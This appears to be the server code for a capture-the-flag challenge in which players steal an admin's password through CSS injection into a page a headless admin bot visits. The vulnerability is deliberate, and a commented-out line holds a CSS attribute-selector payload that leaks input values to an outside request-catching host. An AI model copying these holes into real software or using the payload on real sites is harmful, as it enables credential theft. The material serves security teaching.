import express from 'express'
import puppeteer from 'puppeteer'
import path from 'path'
import bodyParser from 'body-parser'
import session from 'express-session'

const appRoot = process.env.APP_ROOT ?? path.join(__dirname, '..')
const app = express()
const port = 8080
const users = [
  {
    username: 'bobtheadmin',
    password: 'cherryripe',
    isAdmin: true
  }
]

app.set('view engine', 'pug')
app.set('views', path.join(appRoot, 'pages'))

app.use(bodyParser.urlencoded({ extended: true }))
app.use(session({ secret: 'this is a very secret secret' }))

app.get('/', (req, res) => {
  // res.render('../pages/index.pug', { title: 'Hey', message: 'Hello there!', username: 'Test username', styles: 'h1 {color: red} input[value^=T] {background-image: url(https://enwxngp7ymneh.x.pipedream.net/T)}' })
  res.render('index', {
    notLoggedIn: req.session.user === undefined,
    username: req.session.user?.username ?? ''
  })
})

app.post('/css-submit', (req, res) => {
  void (async () => {
    const browser = await puppeteer.launch({
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox'
      ]
    })
    const page = await browser.newPage()

    await page.goto('http://localhost:8080/login', { waitUntil: 'networkidle0' })
    await page.type('#username', 'bobtheadmin')
    await page.type('#password', 'cherryripe')
    await page.click('button[type=submit]')

    await page.goto(
      `http://localhost:8080/account?css=${encodeURIComponent(req.body.css)}`,
      { waitUntil: 'networkidle0' }
    )
    await new Promise((resolve) => setTimeout(resolve, 1000))

    await browser.close()

    res.render('submit')
  })()
})

app.get('/login', (req, res) => {
  res.render('login')
})

app.post('/login', (req, res) => {
  const isBlank = (val: unknown): boolean => val === undefined || val === null || val === ''
  if (isBlank(req.body.username) || isBlank(req.body.password)) {
    res.status(400)
    res.send('Invalid details!')
  } else {
    const user = users.find((u) => u.username === req.body.username && u.password === req.body.password)
    if (user === undefined) {
      res.status(403)
      res.send('Invalid login!')
    } else {
      req.session.user = user
      res.redirect('/')
    }
  }
})

app.get('/register', (req, res) => {
  res.render('register')
})

app.post('/register', (req, res) => {
  const isBlank = (val: unknown): boolean => val === undefined || val === null || val === ''
  if (isBlank(req.body.username) || isBlank(req.body.password)) {
    res.status(400)
    res.send('Invalid details!')
  } else {
    users.forEach(user => {
      if (user.username === req.body.username) {
        res.render('signup', {
          message: 'User Already Exists! Login or choose another user id'
        })
      }
    })
    const newUser = { username: req.body.username, password: req.body.password, isAdmin: false }
    users.push(newUser)
    req.session.user = newUser
    res.redirect('/')
  }
})

app.get('/account', (req, res) => {
  const loggedIn = req.session.user !== undefined
  const username = req.session.user?.username
  const password = req.session.user?.password
  let css = String(req.query.css ?? '')
  css = css.replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
  res.render('account', { loggedIn, username, password, css })
})

app.get('/secrets', (req, res) => {
  const isAdmin = req.session.user?.isAdmin
  res.render('secrets', { isAdmin })
})

app.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/')
  })
})

app.get('/hint', (req, res) => {
  const hints = [
    'Psst! Without being logged in, you won\'t sneak a peek at the secrets page!',
    'Hmm, think you can get a hold of some juicy info from Bob\'s account when he logs in?',
    'A little birdie told me this could come in handy: https://public.requestbin.com/',
    'Ever thought about eavesdropping on form submissions? It might reveal some interesting secrets!',
    'CSS can do more than just make things pretty; it can help you uncover hidden treasures!',
    'A master of illusion knows how to manipulate more than just colors and shapes.',
    'In the world of secrets, sometimes you have to make others spill the beans!',
    'If you want to write some CSS to make your page look cool, this is a great resource: https://www.w3schools.com/cssref/css_selectors.asp',
    'This isn\'t a hint, I just wanted to say you\'re doing great, and I\'m sure you\'ll work this out soon! Keep it up!'
  ]
  const randomIndex = Math.floor(Math.random() * hints.length)
  const randomHint = hints[randomIndex]
  res.render('hint', { hint: randomHint })
})

app.use(express.static(path.join(appRoot, 'static')))

app.listen(port, () => {
  console.log(`App listening on port ${port}`)
})
